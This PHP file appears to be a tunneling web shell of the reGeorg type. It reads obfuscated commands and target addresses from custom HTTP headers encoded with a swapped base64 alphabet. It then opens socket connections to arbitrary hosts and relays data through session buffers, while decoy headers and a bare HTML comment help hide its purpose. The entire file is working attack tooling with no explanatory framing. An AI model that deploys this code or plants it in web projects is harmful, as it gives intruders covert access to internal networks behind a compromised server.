<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[ucwords(strtolower($arh_key))] = $val;
            }
        }
        return($arh);
    }
}

set_time_limit(0);
$headers=apache_request_headers();
$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "b52iz71RrsA3/Iy0QxhmjkKUGwJM6pCfW9agoZOl4tYPc+XnDTBVvLudHqN8EFeS";

$cmd = $headers["Ltsuemfosflazre"];
$mark = substr($cmd,0,22);
$cmd = substr($cmd, 22);
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;

switch($cmd){
    case "E2kbiWGLXEtN5FqFJKsOKL9uKE_7Azkjlh9LyG4CR66A30blCNMkPq8JffM":
        {
            $target_ary = explode("|", base64_decode(strtr($headers["Qwzykakjdyczyjle"], $de, $en)));
            $target = $target_ary[0];
            $port = (int)$target_ary[1];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                header('Ko: m3SWJkApE6v1v7_WRYpCwGk6u58uhAyIlfWVUoyhjVeI4_qUTFneMJ09PpP');
                header('Npodbequr: PT3_ZCNLAs34TEJ0BvIgXhCYGXMXCKC1Kscz6YdXsHumui4DLWLo2KwI92');
                return;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "nGRw0HvAKDyVuGv_t5W7cX7pFgy1r3IB45_8D":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "sBDcLjNls01Zkh_1__VhalC0k9D5if":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header('Ko: DNRG7OAFh6qZkNDq2Fi80sw70DmoQ6tXUk7jlEkHc');
                header("Connection: Keep-Alive");
                echo strtr(base64_encode($readBuffer), $en, $de);
            } else {
                header('Ko: m3SWJkApE6v1v7_WRYpCwGk6u58uhAyIlfWVUoyhjVeI4_qUTFneMJ09PpP');
            }
        }
        break;
    case "Vu2Aint_ja6oPNFI8vZsgBwNzT6mNfdKWkAiN2vPXbOnQvVFEtDo_ULwM": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                header('Ko: m3SWJkApE6v1v7_WRYpCwGk6u58uhAyIlfWVUoyhjVeI4_qUTFneMJ09PpP');
                header('Npodbequr: i3QdJ7gr_0uOgFVQPokvBR8K1');
                return;
            }
            header('Content-Type: application/octet-stream');
            $rawPostData = file_get_contents("php://input");
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
                session_write_close();
                header('Ko: DNRG7OAFh6qZkNDq2Fi80sw70DmoQ6tXUk7jlEkHc');
                header("Connection: Keep-Alive");
            } else {
                header('Ko: m3SWJkApE6v1v7_WRYpCwGk6u58uhAyIlfWVUoyhjVeI4_qUTFneMJ09PpP');
                header('Npodbequr: JB10Lo9Acwy3DBvXldUnDtmjl28WvsJ3maPlRIpavFTEkFBtO09bzjEx7juxFH');
            }
        }
        break;
    default: {
        @session_start();
        session_write_close();
        exit("<!-- e0lcUq3YdIWjmk4PwuGfDO_ -->");
    }
}
